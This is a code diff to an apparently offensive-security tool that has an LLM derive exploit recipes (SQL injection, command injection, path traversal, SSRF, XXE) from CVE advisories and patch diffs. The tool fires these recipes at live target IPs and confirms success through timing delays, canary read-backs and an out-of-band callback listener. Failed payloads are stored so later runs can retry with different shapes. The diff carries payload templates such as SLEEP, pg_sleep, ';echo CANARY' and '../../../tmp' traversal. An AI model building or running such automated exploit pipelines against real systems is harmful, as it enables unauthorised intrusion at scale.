@@ -16575,10 +16575,10 @@ def _load_cve_exploit_specs():
 
 
 def _ensure_derived_cve_specs_table():
-    """Durable store for agent-DERIVED exploit specs (verified recipes the auto-
-    derivation pipeline produced from advisory+patch intel). Separate from the
-    hand-authored YAML so the two sources are distinguishable. YAML wins when
-    both have an entry (operator-curated beats auto-derived)."""
+    """Durable store for agent-DERIVED exploit specs. YAML wins when both have an
+    entry. Tracks TENTATIVE specs (plausible but not yet verified) so the agent
+    improves them over successive runs — the key: hints on what already failed.
+    """
     try:
         with get_db() as c, c.cursor() as cur:
             cur.execute("""
@@ -16591,13 +16591,203 @@ def _ensure_derived_cve_specs_table():
                     verified      boolean NOT NULL DEFAULT false,
                     verify_method text,
                     verify_evidence text,
-                    source        text,           -- 'intel' | 'intel+fuzz' | 'fuzz'
+                    source        text,
                     derived_at    timestamptz NOT NULL DEFAULT now(),
-                    last_verified timestamptz
+                    last_verified timestamptz,
+                    status        text NOT NULL DEFAULT 'tentative',
+                    attempts      integer NOT NULL DEFAULT 0,
+                    last_failure  text,
+                    refine_hints  jsonb NOT NULL DEFAULT '{}'::jsonb
                 )""")
+            # idempotent column adds for in-place upgrades
+            for col, ddl in (
+                ("status", "text NOT NULL DEFAULT 'tentative'"),
+                ("attempts", "integer NOT NULL DEFAULT 0"),
+                ("last_failure", "text"),
+                ("refine_hints", "jsonb NOT NULL DEFAULT '{}'::jsonb"),
+            ):
+                cur.execute(f"ALTER TABLE public.derived_cve_specs ADD COLUMN IF NOT EXISTS {col} {ddl}")
             c.commit()
     except Exception as e:  # noqa: BLE001
         logging.debug("ensure derived_cve_specs failed: %s", e)
+
+
+def _store_tentative_spec(cve, product, version, spec, verdict, source):
+    """Persist a PLAUSIBLE-but-not-yet-verified recipe so the next build attempt
+    starts from it + the hints of what already failed. Operator ask: "if a payload
+    is plausible, store tentative ones to test and improve to reach success."
+    Each failed attempt appends to refine_hints.tried_* so the next derivation
+    doesn't repeat it."""
+    import json as _json
+    try:
+        _ensure_derived_cve_specs_table()
+        tried_payload = (spec.get("injection") or {}).get("payload_template", "")
+        tried_endpoint = (spec.get("request") or {}).get("path", "")
+        tried_proof = ("timing" if (spec.get("assertion") or {}).get("min_seconds")
+                       else "read_back")
+        with get_db() as c, c.cursor() as cur:
+            cur.execute("SELECT attempts, refine_hints FROM public.derived_cve_specs "
+                        "WHERE cve = %s", (str(cve).upper(),))
+            row = cur.fetchone()
+            hints = (row[1] if row else {}) or {}
+            if not isinstance(hints, dict):
+                hints = {}
+            for k in ("tried_payloads", "tried_endpoints", "tried_proof_models"):
+                hints.setdefault(k, [])
+            if tried_payload and tried_payload not in hints["tried_payloads"]:
+                hints["tried_payloads"].append(tried_payload)
+            if tried_endpoint and tried_endpoint not in hints["tried_endpoints"]:
+                hints["tried_endpoints"].append(tried_endpoint)
+            if tried_proof and tried_proof not in hints["tried_proof_models"]:
+                hints["tried_proof_models"].append(tried_proof)
+            # last_failure captures what verify complained about so the next
+            # extraction can route around it (e.g. "canary_missing" → try two-req
+            # or OOB; "endpoint_404" → try discovery)
+            new_attempts = (row[0] if row else 0) + 1
+            cur.execute("""
+                INSERT INTO public.derived_cve_specs
+                  (cve, product, version, vuln_class, spec, verified, status,
+                   verify_method, verify_evidence, source, attempts, last_failure, refine_hints)
+                VALUES (%s,%s,%s,%s,%s::jsonb, false, 'tentative',
+                        %s, %s, %s, %s, %s, %s::jsonb)
+                ON CONFLICT (cve) DO UPDATE SET
+                  spec = EXCLUDED.spec, status = 'tentative',
+                  verify_method = EXCLUDED.verify_method,
+                  verify_evidence = EXCLUDED.verify_evidence,
+                  source = EXCLUDED.source,
+                  attempts = EXCLUDED.attempts,
+                  last_failure = EXCLUDED.last_failure,
+                  refine_hints = EXCLUDED.refine_hints
+            """, (str(cve).upper(), product, version, spec.get("vuln_class"),
+                  _json.dumps(spec), verdict.get("method"),
+                  (verdict.get("evidence") or "")[:1000], source,
+                  new_attempts, verdict.get("method"), _json.dumps(hints)))
+            c.commit()
+    except Exception as e:  # noqa: BLE001
+        logging.debug("store tentative spec failed: %s", e)
+
+
+def _load_tentative_spec(cve):
+    """Load the current tentative spec + hints for a CVE so the next attempt can
+    build on it. Returns {spec, attempts, last_failure, hints} or None."""
+    _ensure_derived_cve_specs_table()
+    try:
+        with get_db() as c, c.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute("SELECT spec, attempts, last_failure, refine_hints "
+                        "FROM public.derived_cve_specs "
+                        "WHERE cve = %s AND status = 'tentative'",
+                        (str(cve).upper(),))
+            r = cur.fetchone()
+            if r:
+                return {"spec": r["spec"], "attempts": r["attempts"],
+                        "last_failure": r["last_failure"],
+                        "hints": r["refine_hints"] or {}}
+    except Exception:  # noqa: BLE001
+        pass
+    return None
+
+
+def _oob_listener_setup(port=18099):
+    """Start a short-lived HTTP server on kali-listener that logs every request
+    to /tmp/oob.<port>.log — used as the OOB-callback proof oracle. Idempotent:
+    if a listener is already running on the port, reuses it. Returns the URL
+    base callers inject into exploit payloads: http://kali-listener:<port>/<canary>.
+    The listener returns 200 and logs the path, so a target that fetches our URL
+    leaves a durable receipt we grep for the canary."""
+    import httpx as _hx
+    listener = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")
+    # start the HTTP server in the background on kali-listener; writes an access
+    # log we can read with cat /tmp/oob.<port>.log. nohup detaches so the
+    # /vectors/run request returns immediately.
+    boot = (
+        f"pgrep -f 'oob_srv.{port}' >/dev/null || "
+        f"(nohup python3 -c \""
+        f"import http.server as h, socketserver as s;"
+        f" open('/tmp/oob.{port}.log','w').close();"
+        f" h.SimpleHTTPRequestHandler.log_message=lambda self,fmt,*a:"
+        f" open('/tmp/oob.{port}.log','a').write(fmt%a+chr(10));"
+        f" s.TCPServer(('0.0.0.0',{port}),h.SimpleHTTPRequestHandler).serve_forever()"
+        f"\" >/tmp/oob_srv.{port}.out 2>&1 &); sleep 0.3; "
+        f"echo OOB_READY_{port}")
+    try:
+        r = _hx.post(f"{listener.rstrip('/')}/vectors/run",
+                     json={"command": boot, "target": "127.0.0.1", "port": port,
+                           "timeout": 5},
+                     headers={"x-api-key": API_KEY}, verify=False, timeout=10)
+        if r.status_code >= 500:
+            return None
+    except Exception:  # noqa: BLE001
+        return None
+    return {"url_base": f"http://kali-listener:{port}", "log_path": f"/tmp/oob.{port}.log",
+            "port": port}
+
+
+def _oob_check_hit(canary, log_path="/tmp/oob.18099.log", timeout=5):
+    """Read the OOB listener's log and check whether `canary` appears — the
+    exploit's URL contained `.../<canary>`, so if the target made the request
+    the canary is in the log path. Returns (hit: bool, log_tail: str)."""
+    import httpx as _hx
+    listener = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")
+    try:
+        r = _hx.post(f"{listener.rstrip('/')}/vectors/run",
+                     json={"command": f"cat {log_path} 2>/dev/null | tail -20",
+                           "target": "127.0.0.1", "port": 80, "timeout": timeout},
+                     headers={"x-api-key": API_KEY}, verify=False, timeout=timeout + 5)
+        d = r.json() if r.status_code < 500 else {}
+        out = (d.get("output", "") if isinstance(d, dict) else "") or ""
+        return (canary in out, out[-800:])
+    except Exception:  # noqa: BLE001
+        return (False, "")
+
+
+def _two_request_verify(ip, port, exploit_req, verify_req, canary, timeout=25):
+    """read_back_after_action proof: run exploit (which writes/changes something,
+    with a canary embedded), then run a follow-up read request, and confirm the
+    canary appears in the read response. Returns {verified, method, evidence}."""
+    exploit_cmd = _curl_from_cve_spec(ip, port, exploit_req, canary)
+    out1 = _curl_run(ip, port, exploit_cmd, timeout=timeout)
+    verify_cmd = _curl_from_cve_spec(ip, port, verify_req, canary)
+    out2 = _curl_run(ip, port, verify_cmd, timeout=timeout)
+    if canary in (out2 or ""):
+        return {"verified": True, "method": "read_back_after_action",
+                "evidence": f"canary {canary} appeared in follow-up read "
+                            f"(exploit→verify)"}
+    return {"verified": False, "method": "two_req_canary_missing",
+            "evidence": f"follow-up read did not contain canary; "
+                        f"exploit response was {len(out1 or '')} bytes, "
+                        f"verify response was {len(out2 or '')} bytes"}
+
+
+def _oob_verify(ip, port, exploit_req, canary, timeout=25):
+    """oob_callback proof: set up a listener on kali-listener, substitute our
+    URL (http://kali-listener:PORT/<canary>) into the exploit payload, run it,
+    and check if the target fetched our URL. Returns {verified, method, evidence}."""
+    oob = _oob_listener_setup()
+    if not oob:
+        return {"verified": False, "method": "oob_setup_failed",
+                "evidence": "could not start OOB listener on kali-listener"}
+    oob_url = f"{oob['url_base']}/{canary}"
+    # Substitute {OOB_URL}/{OOB_CANARY} placeholders in the exploit's body/query/header
+    import copy as _c
+    req = _c.deepcopy(exploit_req)
+    for section in ("body", "query", "headers"):
+        s = req.get(section)
+        if isinstance(s, dict):
+            for k in list(s.keys()):
+                if isinstance(s[k], str):
+                    s[k] = s[k].replace("{OOB_URL}", oob_url).replace("{OOB_CANARY}", canary)
+    cmd = _curl_from_cve_spec(ip, port, req, canary)
+    out = _curl_run(ip, port, cmd, timeout=timeout)
+    # Give the target a moment to make the outbound call
+    import time as _t; _t.sleep(1.5)
+    hit, log_tail = _oob_check_hit(canary, log_path=oob["log_path"])
+    if hit:
+        return {"verified": True, "method": "oob_callback",
+                "evidence": f"target fetched {oob_url} (canary in listener log)"}
+    return {"verified": False, "method": "oob_no_callback",
+            "evidence": f"no listener hit for canary {canary}; "
+                        f"exploit response len={len(out or '')}; "
+                        f"log tail: {log_tail[:300]!r}"}
 
 
 def _cve_exploit_spec(cve):
@@ -16674,7 +16864,8 @@ def _extract_patch_urls(advisory_text, poc_text=""):
     return urls[:4]
 
 
-def _llm_extract_exploit_recipe(cve, product, version, intel, patch_diffs, model=None):
+def _llm_extract_exploit_recipe(cve, product, version, intel, patch_diffs, model=None,
+                                prior_hints=None):
     """Ask the LLM to produce a STRUCTURED recipe (endpoint/method/content_type/
     body/headers/injection payload template + proof model) from the gathered
     intel + patch diffs. Returns {endpoint, method, content_type, body, headers,
@@ -16688,6 +16879,22 @@ def _llm_extract_exploit_recipe(cve, product, version, intel, patch_diffs, model
         patch_section = "\n\nFIX COMMIT DIFF(S) — the lines BEFORE the fix show the vulnerable code:\n"
         for i, (url, diff) in enumerate(patch_diffs[:3], 1):
             patch_section += f"\n--- patch {i}: {url} ---\n{diff[:6000]}\n"
+    # Prior-attempt hints: tell the LLM what already FAILED so it doesn't repeat.
+    hints_section = ""
+    if prior_hints and any(prior_hints.values()):
+        tp = prior_hints.get("tried_payloads") or []
+        te = prior_hints.get("tried_endpoints") or []
+        tm = prior_hints.get("tried_proof_models") or []
+        hints_section = (
+            f"\n\nPRIOR ATTEMPTS (do NOT repeat these — try a DIFFERENT shape):\n"
+            f"  tried payloads: {tp[:8]}\n"
+            f"  tried endpoints: {te[:5]}\n"
+            f"  tried proof_models: {tm}\n"
+            f"If timing already failed and the advisory describes a state change, "
+            f"switch to read_back_after_action. If a single-request read_back "
+            f"failed, switch to oob_callback (SSRF/XXE) or read_back_after_action "
+            f"(file write / priv-esc).\n"
+        )
     prompt = (
         f"You are a security engineer on an AUTHORIZED penetration test documenting "
         f"{cve} ({product or '?'} {version or ''}) so the tester can validate it. "
@@ -16695,7 +16902,7 @@ def _llm_extract_exploit_recipe(cve, product, version, intel, patch_diffs, model
         f"where the removed lines are the vulnerable code), extract a STRUCTURED "
         f"request RECIPE that will trigger the weakness. Output JSON ONLY, no prose.\n\n"
         f"REFERENCE:\n{(intel.get('combined') or '')[:14000]}\n"
-        f"{patch_section}\n\n"
+        f"{patch_section}{hints_section}\n\n"
         f'Required JSON shape: {{"vuln_class": "sqli|rce|lfi|ssrf|xxe|ssti|idor", '
         f'"endpoint": "/path", "method": "GET|POST|PUT|DELETE|PATCH", '
         f'"content_type": "form|json|xml|raw", "body": {{...}} or null, '
@@ -16710,18 +16917,32 @@ def _llm_extract_exploit_recipe(cve, product, version, intel, patch_diffs, model
         f'"evidence": "<one sentence citing the advisory / fix line that justifies '
         f'the extraction>", "confidence": 0.0}}\n'
         f"GUIDANCE:\n"
-        f"- When the advisory names an endpoint (e.g. 'via editCategories.php') "
-        f"but not the exact param, pick the MOST LIKELY common param for the "
-        f"vuln class (SQLi: id/user/username/cat/page; file: file/path/name/url) "
-        f"and record best-guess with lower confidence. Live-verify + param-fuzz "
-        f"will catch mis-guesses, so err toward emitting a recipe over returning {{}}.\n"
-        f"- For SQLi default to timing proof (SLEEP for MySQL/MariaDB, pg_sleep "
-        f"for Postgres) — most reliable, no visible-output assumption.\n"
-        f"- For RCE/LFI prefer read_back: payload includes a canary (e.g. "
-        f"`;echo CANARY_{{CANARY}}` or `/../../../tmp/{{CANARY}}`) and set "
-        f"expected_canary_in_output to a regex matching that canary.\n"
-        f"- Only return {{}} when the advisory names NEITHER an endpoint NOR a "
-        f"vulnerable component. A named component is enough to produce a recipe."
+        f"- When the advisory names an endpoint but not the exact param, pick the "
+        f"MOST LIKELY common param for the vuln class (SQLi: id/user/username/cat/"
+        f"page; file: file/path/name/url) and record best-guess with lower confidence.\n"
+        f"- Live-verify + param-fuzz catches mis-guesses, so err toward emitting a "
+        f"recipe over returning {{}}; only return {{}} when the advisory names "
+        f"NEITHER an endpoint NOR a vulnerable component.\n"
+        f"PROOF MODELS (pick the one the vuln class makes verifiable):\n"
+        f"- 'timing' — blind SQLi; payload uses SLEEP({{N}}) (MySQL/MariaDB) or "
+        f"pg_sleep({{N}}) (Postgres); verifier runs it + a scaled version.\n"
+        f"- 'read_back' — the exploit response ITSELF contains the proof (error-"
+        f"based SQLi, reflected XSS, RCE `;echo CANARY_{{CANARY}}`); set "
+        f"expected_canary_in_output regex.\n"
+        f"- 'read_back_after_action' — exploit writes/changes state (file write, "
+        f"DB insert, priv-esc, config change) and a SECOND request reads it back. "
+        f"Return a verify_request field: {{method, path, query, body, headers, "
+        f"content_type}} that fetches the planted canary. Payload embeds {{CANARY}}; "
+        f"verify_request references {{CANARY}} too (e.g. GET /uploads/{{CANARY}}.txt).\n"
+        f"- 'oob_callback' — SSRF, XXE, blind-RCE with network primitive. The "
+        f"payload references {{OOB_URL}} (the verifier spins up a listener and "
+        f"substitutes a real URL); verification = the listener gets a hit for "
+        f"the canary. Example: `url: {{OOB_URL}}` in a body param.\n"
+        f"When the advisory describes a file-write/DB-write/priv-esc or any state "
+        f"change, you MUST use read_back_after_action with a verify_request. "
+        f"When it describes SSRF or any outbound-fetch, use oob_callback.\n"
+        f"Also return a `verify_request` top-level key when proof_model is "
+        f"read_back_after_action (otherwise omit it)."
     )
     try:
         res = _llm_for_model(prompt, model=model, caller="cve_recipe_extract", num_predict=1024)
@@ -16762,10 +16983,12 @@ def _recipe_to_spec(cve, product, recipe):
     assertion = {"min_seconds": int(recipe.get("min_seconds") or 5), "max_seconds": 30}
     if recipe.get("proof_model") == "read_back" and recipe.get("expected_canary_in_output"):
         assertion = {"expect_regex": recipe["expected_canary_in_output"]}
-    return {
+    spec = {
         "cve": cve, "product": product,
         "vuln_class": recipe.get("vuln_class") or "sqli",
         "transport": "http",
+        "proof_model": recipe.get("proof_model") or (
+            "timing" if assertion.get("min_seconds") else "read_back"),
         "request": {
             "method": (recipe.get("method") or "POST").upper(),
             "path": recipe.get("endpoint") or "/",
@@ -16779,20 +17002,44 @@ def _recipe_to_spec(cve, product, recipe):
         "notes": f"AUTO-DERIVED from advisory + patch diff. Evidence: "
                  f"{(recipe.get('evidence') or '')[:300]}",
     }
+    # Carry the verify_request shape when LLM declared read_back_after_action.
+    vr = recipe.get("verify_request") or recipe.get("verify")
+    if isinstance(vr, dict) and vr.get("path"):
+        spec["verify_request"] = {
+            "method": (vr.get("method") or "GET").upper(),
+            "path": vr["path"],
+            "content_type": vr.get("content_type") or "form",
+            **({"query": vr["query"]} if vr.get("query") else {}),
+            **({"body": vr["body"]} if vr.get("body") else {}),
+            **({"headers": vr["headers"]} if vr.get("headers") else {}),
+        }
+    return spec
 
 
 def _live_verify_recipe(ip, port, spec, timeout=30):
-    """VERIFY a derived spec against the live target BEFORE storing it. For a
-    timing spec, run the SLEEP(5) payload and confirm elapsed >= 4.5s and the
-    scaled SLEEP(10) also fires. Returns {verified, method, evidence}."""
+    """VERIFY a derived spec against the live target BEFORE storing it. Dispatches
+    on proof_model: timing (scaling-confirmed) | read_back (single-request canary)
+    | read_back_after_action (two-request exploit→read-back) | oob_callback
+    (listener catches target's outbound hit). Returns {verified, method, evidence}."""
     import time as _t
     tmpl = (spec.get("injection") or {}).get("payload_template", "")
     req = spec.get("request") or {}
     assertion = spec.get("assertion") or {}
-    # Baseline (small/benign) + payload timing
-    try:
+    proof = (spec.get("proof_model")
+             or (spec.get("injection") or {}).get("proof_model")
+             or "").lower()
+    # Infer proof model from assertion when not declared
+    if not proof:
         if assertion.get("min_seconds"):
-            # Timing proof
+            proof = "timing"
+        elif spec.get("verify_request"):
+            proof = "read_back_after_action"
+        elif "{OOB_URL}" in (tmpl or "") or "{OOB_CANARY}" in str(req):
+            proof = "oob_callback"
+        elif assertion.get("expect_regex"):
+            proof = "read_back"
+    try:
+        if proof == "timing":
             baseline_payload = tmpl.replace("{N}", "0") if "SLEEP" in tmpl.upper() else "1"
             payload_5 = tmpl.replace("{N}", "5")
             payload_10 = tmpl.replace("{N}", "10")
@@ -16803,31 +17050,55 @@ def _live_verify_recipe(ip, port, spec, timeout=30):
             _curl_run(ip, port, _curl_from_cve_spec(ip, port, req, payload_5), timeout=timeout)
             t5 = _t.time() - t0
             if t5 - b < 3.5:
-                return {"verified": False, "method": "timing", "elapsed_base": round(b, 2),
-                        "elapsed_5": round(t5, 2), "evidence": "payload did not block"}
-            # Confirm scaling: SLEEP(10) must be ~5s slower than SLEEP(5)
+                return {"verified": False, "method": "timing_did_not_block",
+                        "evidence": f"baseline={b:.1f}s SLEEP(5)={t5:.1f}s (no delay)"}
             t0 = _t.time()
             _curl_run(ip, port, _curl_from_cve_spec(ip, port, req, payload_10), timeout=timeout + 10)
             t10 = _t.time() - t0
             if t10 - t5 < 3.5:
                 return {"verified": False, "method": "timing_unconfirmed",
-                        "elapsed_5": round(t5, 2), "elapsed_10": round(t10, 2),
-                        "evidence": "second run did not scale with payload"}
+                        "evidence": f"SLEEP(5)={t5:.1f}s SLEEP(10)={t10:.1f}s (no scaling)"}
             return {"verified": True, "method": "latency_confirmed",
                     "evidence": f"baseline={b:.1f}s SLEEP(5)={t5:.1f}s SLEEP(10)={t10:.1f}s"}
-        if assertion.get("expect_regex"):
-            # Read-back proof
+        if proof == "read_back":
             canary = "POC" + os.urandom(5).hex()
             payload = tmpl.replace("{CANARY}", canary).replace("{INJ}", canary)
             out = _curl_run(ip, port, _curl_from_cve_spec(ip, port, req, payload), timeout=timeout)
-            if canary in (out or "") or _re_search_safe(assertion["expect_regex"], out or ""):
+            if canary in (out or "") or _re_search_safe(assertion.get("expect_regex", ""), out or ""):
                 return {"verified": True, "method": "canary_read_back",
-                        "evidence": f"canary {canary} appeared in output"}
+                        "evidence": f"canary {canary} appeared in response"}
             return {"verified": False, "method": "canary_missing",
-                    "evidence": "canary did not appear in output"}
+                    "evidence": "canary did not appear in single-request response"}
+        if proof == "read_back_after_action":
+            # Two-request: spec needs a `verify_request` (same shape as request).
+            vreq = spec.get("verify_request") or {}
+            if not vreq:
+                return {"verified": False, "method": "spec_missing_verify_request",
+                        "evidence": "read_back_after_action proof needs spec.verify_request"}
+            canary = "POC" + os.urandom(5).hex()
+            # Substitute {CANARY} in exploit's payload; verify request may also
+            # need the canary (e.g. to GET /path/<canary>)
+            import copy as _c
+            ereq = _c.deepcopy(req)
+            vreq2 = _c.deepcopy(vreq)
+            # Also substitute {CANARY} in body/query/headers values of both
+            for r in (ereq, vreq2):
+                for section in ("body", "query", "headers"):
+                    s = r.get(section)
+                    if isinstance(s, dict):
+                        for k in list(s.keys()):
+                            if isinstance(s[k], str):
+                                s[k] = s[k].replace("{CANARY}", canary)
+                if isinstance(r.get("path"), str):
+                    r["path"] = r["path"].replace("{CANARY}", canary)
+            return _two_request_verify(ip, port, ereq, vreq2, canary, timeout=timeout)
+        if proof == "oob_callback":
+            canary = "POC" + os.urandom(5).hex()
+            return _oob_verify(ip, port, req, canary, timeout=timeout)
     except Exception as e:  # noqa: BLE001
         return {"verified": False, "method": "verify_error", "evidence": str(e)}
-    return {"verified": False, "method": "no_assertion", "evidence": "spec had no verifiable assertion"}
+    return {"verified": False, "method": "no_proof_model",
+            "evidence": f"spec declared no verifiable proof_model (assertion={assertion})"}
 
 
 def _re_search_safe(pattern, text):
@@ -16893,8 +17164,13 @@ def _derive_cve_spec(cve, product, version, ip, port, model=None, auth=None,
         d = _fetch_patch_diff(u)
         if d:
             patches.append((u, d))
-    # 3. LLM extract
-    recipe = _llm_extract_exploit_recipe(cve, product, version, intel, patches, model=model)
+    # 2b. Load prior tentative + hints — the agent LEARNS across runs so it
+    # doesn't repeat payloads/endpoints/proof-models that already failed.
+    prior = _load_tentative_spec(cve) or {}
+    prior_hints = prior.get("hints") or {}
+    # 3. LLM extract — pass prior hints so the LLM avoids tried-and-failed shapes
+    recipe = _llm_extract_exploit_recipe(cve, product, version, intel, patches,
+                                         model=model, prior_hints=prior_hints)
     if not recipe.get("endpoint") or not recipe.get("injection_param"):
         return {"verified": False, "source": "extract",
                 "spec": None, "evidence": "recipe extraction returned no concrete recipe"}
@@ -16937,8 +17213,14 @@ def _derive_cve_spec(cve, product, version, ip, port, model=None, auth=None,
             _store_derived_spec(cve, product, version, spec, fuzz, source="intel+fuzz")
             return {"verified": True, "source": "intel+fuzz", "spec": spec,
                     "evidence": fuzz.get("evidence")}
-    return {"verified": False, "source": "extract+verify",
-            "spec": spec, "evidence": verdict.get("evidence")}
+    # Nothing verified — but the recipe is PLAUSIBLE (LLM named a concrete
+    # endpoint+param from the advisory). Store as TENTATIVE so the next build
+    # starts from it + the hints of what failed, and improves instead of starting
+    # over. This is the agent-learning loop across runs.
+    _store_tentative_spec(cve, product, version, spec, verdict, source="intel+tentative")
+    return {"verified": False, "source": "extract+verify+tentative",
+            "spec": spec, "evidence": verdict.get("evidence"),
+            "stored_tentative": True, "attempts": (prior.get("attempts") or 0) + 1}
 
 
 def _discover_endpoint_variants(ip, port, named_path, session_cookie=None, timeout=10):
